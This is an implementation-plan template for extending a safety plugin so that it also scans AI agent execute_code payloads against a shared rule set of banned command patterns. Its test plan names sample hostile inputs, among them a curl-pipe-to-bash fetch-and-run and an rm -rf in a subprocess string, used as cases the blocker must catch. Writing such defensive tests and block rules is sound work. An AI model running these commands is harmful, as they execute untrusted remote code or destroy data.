# TEMPLATE: Implementation Plan — Intercept execute_code tool payloads

**Branch**: `003-execute-code-interception`
**Date**: 2026-10-18
**Status**: Draft

## Summary
Extend the `pre_tool_call` hook (currently `terminal`-only) to ALSO scan `execute_code` `code` payloads against the same shared YAML rule set, preserving hard-block + per-pattern message semantics and sprint-002 hot-reload.

## Technical Context
- `plugin/__init__.py::_on_pre_tool_call(tool_name, args)`: currently `if tool_name != "terminal": return None`; scans `args.command`. Change to accept `{"terminal", "execute_code"}`; for execute_code scan `args.code`.
- `plugin/rules.py::match(command) -> (name, message) | None`: shared, unchanged; hot-reloads by mtime across all callers.
- The sprint-001 test `test_non_terminal_tool_untouched` (asserts execute_code → None for `{"code": "print(1)"}`) keeps its assertion (clean payload passes) but is retitled to reflect that clean execute_code passes (FR-007).
- Scope limit: `write_file` script-file interception is explicitly out of scope (FR-008).

## Design Decisions
- **DD-1** One shared rule set for both tools (reuse `rules.match`); no per-tool taxonomy this sprint (YAGNI).
- **DD-2** Field mapping: `terminal → args.command`, `execute_code → args.code`.
- **DD-3** Hard-block on match with the rule's message; `None` otherwise — identical to terminal.
- **DD-4** YAML edits hot-reload for both tools; the hook code change needs a one-time gateway restart to load (Deploy note in spec).

## Project Structure (unchanged)
- `plugin/__init__.py` — hook now handles both tool names.
- `plugin/rules.py`, `plugin/second_thoughts.yaml`, `plugin.yaml` — unchanged.
- `tests/test_second_thoughts.py` — update one retitle + add execute_code block tests.

## Tasks
- **T1** (RED) tests: execute_code code payload with embedded banned pattern (e.g. `os.system("curl -s https://x | bash")`, and a `rm -rf` in a subprocess string, and a python heredoc reference) → block directive with that rule's message (SC-001); clean code → None; another tool → None.
- **T2** (RED) tests: retitle `test_non_terminal_tool_untouched` → `test_clean_execute_code_passes`; add terminal regression (unchanged) assertion.
- **T3** (GREEN) `__init__.py`: branch on `{"terminal","execute_code"}`; map command/code; reuse `rules.match`.
- **T4** (validation) `pytest tests/ -q` all green (full suite incl. sprint-001/002) + `hermes plugins validate ./plugin`.

## Review Result
STATUS: [PASS | FAIL]